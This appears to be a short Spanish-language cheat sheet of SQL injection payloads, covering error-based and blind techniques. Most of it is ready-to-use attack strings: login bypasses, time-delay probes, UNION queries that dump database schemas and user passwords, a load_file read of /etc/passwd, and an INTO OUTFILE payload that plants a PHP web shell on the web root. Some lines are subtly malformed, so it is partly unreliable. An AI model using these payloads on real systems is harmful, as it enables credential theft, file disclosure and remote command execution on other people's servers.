# SQL INJECTION

' " ; <> /* 

2 TIPOS 

## NORMAL
ERRORES The query nbla bla 
* ' or 1=1-- - 
* ' or sleep(5)-- -
* Medir la longitud de columnas de la tabla consultada
* ' order by 4 -- -
1 Consulta de que datos se ven en las columnas 
1.1 Consultar información de la base de datos
```bash
' union select NULL,USER(),NULL,NULL -- -
' union  table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’ -- -
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
*Consultar información especifica de las tablas
'+UNION+SELECT+1,2,username,+password+FROM+users--

* INTO OUTFILE 
' union select NULL,load_file('/etc/passwd'),NULL,NULL -- -
' union select NULL,'me gustan tus nalgas',NULL,NULL INTO outfile /tmp/nalguitas -- -
' union select NULL,'<?php system($_GET["linea de comandos"]);?>',NULL,NULL INTO outfile /var/www/html/shell.php -- -
```
## BLIND

No se ven errores
SELECT * FROM users WHERE user_name='leon'' or sleep(10)-- - and password = '1234'
 ' or 1=1-- -
Payloads largos
SQLMAP